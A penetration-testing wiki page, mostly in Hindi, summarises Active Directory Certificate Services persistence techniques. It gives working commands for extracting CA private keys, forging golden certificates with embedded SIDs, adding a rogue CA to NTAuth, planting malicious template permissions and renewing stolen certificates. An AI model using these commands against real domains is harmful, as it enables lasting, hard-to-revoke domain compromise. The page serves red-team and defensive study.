# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) में साझा किए गए domain persistence techniques का सारांश है**। अधिक विवरण के लिए इसे देखें।

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

आप कैसे बता सकते हैं कि कोई certificate CA certificate है?

कई शर्तें पूरी होने पर यह निर्धारित किया जा सकता है कि कोई certificate CA certificate है:

- certificate CA server पर संग्रहीत होता है, और इसका private key machine के DPAPI द्वारा सुरक्षित होता है, या यदि operating system समर्थित हो तो TPM/HSM जैसे hardware द्वारा।
- certificate के Issuer और Subject fields दोनों CA के distinguished name से मेल खाते हैं।
- केवल CA certificates में ही "CA Version" extension मौजूद होता है।
- certificate में Extended Key Usage (EKU) fields नहीं होते।

इस certificate का private key निकालने के लिए, CA server पर `certsrv.msc` tool built-in GUI के माध्यम से समर्थित तरीका है। हालांकि, यह certificate सिस्टम में संग्रहीत अन्य certificates से अलग नहीं है; इसलिए extraction के लिए [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) जैसी विधियाँ लागू की जा सकती हैं।

Certificate और private key को Certipy का उपयोग करके निम्न कमांड से भी प्राप्त किया जा सकता है:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA प्रमाणपत्र और उसकी निजी कुंजी `.pfx` फ़ॉर्मेट में प्राप्त करने पर, [ForgeCert](https://github.com/GhostPack/ForgeCert) जैसे टूल्स का उपयोग वैध प्रमाणपत्र बनाने के लिए किया जा सकता है:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> प्रमाणपत्र जालसाज़ी का लक्ष्य बनाया गया उपयोगकर्ता प्रक्रिया के सफल होने के लिए Active Directory में सक्रिय और प्रमाणीकृत करने योग्य होना चाहिए। krbtgt जैसे विशेष खातों के लिए प्रमाणपत्र जालसाज़ी प्रभावी नहीं है।

यह नकली प्रमाणपत्र निर्दिष्ट समाप्ति तिथि तक और तब तक **मान्य** रहेगा जब तक कि root CA प्रमाणपत्र **मान्य** है (आमतौर पर 5 से **10+ वर्षों**)। यह **मशीनों** के लिए भी मान्य है, इसलिए **S4U2Self** के साथ मिलाकर, एक हमलावर उस CA प्रमाणपत्र के वैध रहने तक किसी भी domain मशीन पर **स्थायित्व बनाए रख सकता है**।\
इसके अलावा, इस विधि से उत्पन्न किए गए **प्रमाणपत्रों** को **रद्द नहीं किया जा सकता** क्योंकि CA उनके बारे में अवगत नहीं है।

### Operating under Strong Certificate Mapping Enforcement (2025+)

Since February 11, 2025 (after KB5014754 rollout), domain controllers default to **Full Enforcement** for certificate mappings. Practically this means your forged certificates must either:

- लक्ष्य खाते के साथ एक मजबूत बाइंडिंग शामिल हो (उदाहरण के लिए, the SID security extension), या
- लक्ष्य ऑब्जेक्ट के `altSecurityIdentities` attribute पर एक मजबूत, स्पष्ट मैपिंग के साथ जोड़ा गया हो।

एक विश्वसनीय तरीका persistence के लिए है कि चोरी किए गए Enterprise CA से चेन किया गया एक नकली प्रमाणपत्र बनाकर फिर पीड़ित principal पर एक मजबूत स्पष्ट मैपिंग जोड़ दी जाए:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
नोट्स
- यदि आप ऐसे forged certificates बना सकते हैं जिनमें SID सुरक्षा एक्सटेंशन शामिल हो, तो वे Full Enforcement के तहत भी implicitly मैप हो जाएंगे। अन्यथा, explicit मजबूत mappings को प्राथमिकता दें। explicit mappings के बारे में अधिक जानकारी के लिए देखें [account-persistence](account-persistence.md)।
- रद्दीकरण यहाँ रक्षकों की मदद नहीं करता: forged certificates CA database के लिए अज्ञात होते हैं और इसलिए रद्द नहीं किए जा सकते।

#### Full-Enforcement अनुकूल forging (SID-aware)

अपडेट की गई टूलिंग आपको SID को सीधे embed करने की अनुमति देती है, जिससे golden certificates उपयोगी बने रहते हैं भले ही DCs कमजोर mappings को अस्वीकार कर दें:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SID को सम्मिलित करके आप `altSecurityIdentities` को छूने से बच जाते हैं, जिसे निगरानी किया जा सकता है, और फिर भी कठोर मैपिंग जाँच संतुष्ट हो जाती हैं।

## Rogue CA Certificates पर भरोसा - DPERSIST2

`NTAuthCertificates` ऑब्जेक्ट को परिभाषित किया गया है ताकि इसका `cacertificate` attribute एक या अधिक **CA certificates** को रखे, जिसे Active Directory (AD) उपयोग करता है। सत्यापन प्रक्रिया **domain controller** द्वारा यह जाँचती है कि `NTAuthCertificates` ऑब्जेक्ट में वह एंट्री मौजूद है जो authenticating **certificate** के Issuer फ़ील्ड में निर्दिष्ट **CA** से मेल खाती हो। यदि मेल मिलता है तो authentication आगे बढ़ती है।

यदि किसी attacker के पास इस AD ऑब्जेक्ट पर नियंत्रण है, तो वे `NTAuthCertificates` ऑब्जेक्ट में एक self-signed CA certificate जोड़ सकते हैं। सामान्यतः, केवल **Enterprise Admin** समूह के सदस्य, साथ ही **Domain Admins** या **Administrators** जो **forest root’s domain** में हैं, को इस ऑब्जेक्ट को संशोधित करने की अनुमति दी जाती है। वे `certutil.exe` का उपयोग कर `NTAuthCertificates` ऑब्जेक्ट को edit कर सकते हैं, कमांड `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` चलाकर, या [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) का उपयोग करके।

इस technique के लिए कुछ अतिरिक्त सहायक commands:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
This capability is especially relevant when used in conjunction with a previously outlined method involving ForgeCert to dynamically generate certificates.

> Post-2025 mapping considerations: NTAuth में एक rogue CA रखने से केवल जारी करने वाली CA पर ट्रस्ट स्थापित होता है। जब DCs **Full Enforcement** में हों और leaf certificates को logon के लिए उपयोग करना हो, तो leaf में या तो SID security extension होना चाहिए या target object पर एक मजबूत explicit mapping होना चाहिए (उदाहरण के लिए Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## दुर्भावनापूर्ण गलत कॉन्फ़िगरेशन - DPERSIST3

**persistence** के अवसर AD CS के **security descriptor modifications** के माध्यम से बहुत हैं। "[Domain Escalation](domain-escalation.md)" सेक्शन में वर्णित संशोधनों को उच्च अधिकार वाले हमलावर द्वारा दुर्भावनापूर्ण रूप से लागू किया जा सकता है। इसमें संवेदनशील कंपोनेंट्स में "control rights" (उदा., WriteOwner/WriteDACL/etc.) जोड़ना शामिल है, जैसे कि:

- **CA server’s AD computer** object
- **CA server’s RPC/DCOM server**
- किसी भी **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (उदाहरण के लिए, Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, आदि)
- **AD groups delegated rights to control AD CS** by default or by the organization (जैसे built-in Cert Publishers group और इसके किसी भी सदस्य)

एक दुष्प्रयोजन उदाहरण में वह शामिल होगा जहां डोमेन में **elevated permissions** रखने वाला हमलावर default **`User`** certificate template पर अपने लिए **`WriteOwner`** permission जोड़ देता है। शोषण करने के लिए, हमलावर पहले **`User`** template का ownership अपने नाम पर बदलता है। इसके बाद template पर **`mspki-certificate-name-flag`** को **1** पर सेट किया जाएगा ताकि **`ENROLLEE_SUPPLIES_SUBJECT`** सक्षम हो, जिससे अनुरोध में Subject Alternative Name प्रदान करने की अनुमति मिलती है। इसके बाद हमलावर उस **template** का उपयोग करके **enroll** कर सकता है, alternative name के रूप में किसी **domain administrator** नाम का चुनाव कर सकता है, और प्राप्त प्रमाणपत्र का उपयोग DA के रूप में authentication के लिए कर सकता है।

लंबी अवधि के domain persistence के लिए हमलावर जो व्यवहार्य सेटिंग्स कर सकते हैं (पूरा विवरण और detection के लिए देखें {{#ref}}domain-escalation.md{{#endref}}):

- CA policy flags जो requesters से SAN की अनुमति देते हैं (उदा., `EDITF_ATTRIBUTESUBJECTALTNAME2` को सक्षम करना)। इससे ESC1-जैसे रास्ते शोषण योग्य बने रहते हैं।
- Template DACL या सेटिंग्स जो authentication-capable issuance की अनुमति देती हैं (उदा., Client Authentication EKU जोड़ना, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` को सक्षम करना)।
- `NTAuthCertificates` object या CA containers को नियंत्रित करके यदि defenders cleanup की कोशिश करें तो rogue issuers को लगातार फिर से पेश करना।

> [!TIP]
> KB5014754 के बाद कठोर वातावरणों में, इन misconfigurations को explicit strong mappings (`altSecurityIdentities`) के साथ जोड़ने से आपकी जारी की गई या forged certificates तब भी इस्तेमाल योग्य रहती हैं जब DCs strong mapping लागू कर रहे हों।

### Certificate renewal abuse (ESC14) for persistence

यदि आप किसी authentication-capable certificate (या किसी Enrollment Agent वाले) को compromise कर लेते हैं, तो आप उसे अनिश्चितकाल के लिए **renew** कर सकते हैं, बशर्ते जारी करने वाला template प्रकाशित बना रहे और आपकी CA issuer chain पर अब भी भरोसा करे। Renewal मूल identity bindings को बनाए रखता है पर validity बढ़ा देता है, जिससे eviction कठिन हो जाती है जब तक कि template ठीक न किया जाए या CA को republish न किया जाए।
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
यदि डोमेन कंट्रोलर **Full Enforcement** में हैं, तो नवीनीकृत leaf certificate को बिना `altSecurityIdentities` छेड़े भी मजबूत रूप से मैप बनाए रखने के लिए `-sid <victim SID>` जोड़ें (या ऐसा template उपयोग करें जिसमें SID security extension अभी भी शामिल हो)। CA admin rights वाले हमलावर `policy\RenewalValidityPeriodUnits` को भी समायोजित कर नवीनीकृत जीवनकाल बढ़ा सकते हैं, इससे पहले कि वे अपने लिए खुद एक cert जारी करें।

## संदर्भ

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
